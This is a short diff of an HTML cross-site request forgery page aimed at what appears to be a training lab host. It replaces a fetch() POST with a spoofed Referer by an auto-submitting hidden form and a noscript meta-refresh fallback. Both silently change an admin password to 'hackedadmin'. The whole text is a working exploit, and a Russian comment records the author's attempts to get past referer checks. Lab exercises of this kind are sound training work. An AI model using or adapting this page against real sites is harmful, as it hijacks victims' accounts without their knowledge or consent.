@@ -5,15 +5,10 @@
       <input type="hidden" name="new_password" value="hackedadmin">
     </form>
     <script>
-  // Попробуй отправить с кастомным referer через fetch
-      fetch('http://web.ygvqaa4qrdzijcdljzdc.labs.cyber-ed.space/main.php', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/x-www-form-urlencoded',
-          'Referer': 'http://web.ygvqaa4qrdzijcdljzdc.labs.cyber-ed.space/main.php'
-        },
-        body: 'action=change_password&new_password=hackedadmin'
-      });
+      document.getElementById('f').submit();
     </script>
+    <noscript>
+      <meta http-equiv="refresh" content="0; url='http://web.ygvqaa4qrdzijcdljzdc.labs.cyber-ed.space/main.php?action=change_password&new_password=hackedadmin'">
+    </noscript>
   </body>
 </html>
